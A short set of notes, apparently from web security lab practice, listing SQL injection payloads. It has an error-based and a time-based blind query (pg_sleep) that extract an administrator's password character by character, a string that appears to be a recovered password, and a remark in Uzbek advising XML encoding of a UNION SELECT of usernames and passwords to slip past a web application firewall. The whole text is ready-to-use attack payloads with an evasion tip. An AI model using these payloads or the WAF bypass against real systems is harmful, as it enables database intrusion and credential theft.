' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM users)='a error based
'%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
jadexxi11celncib65c7  BLIND TIME BASED
id orqali topilgan sqli dan foydalanishda UNION SELECT username || '~' || password FROM users buni WAF tutib olishi mumkin shuning uchun buni xml encodelash kerak
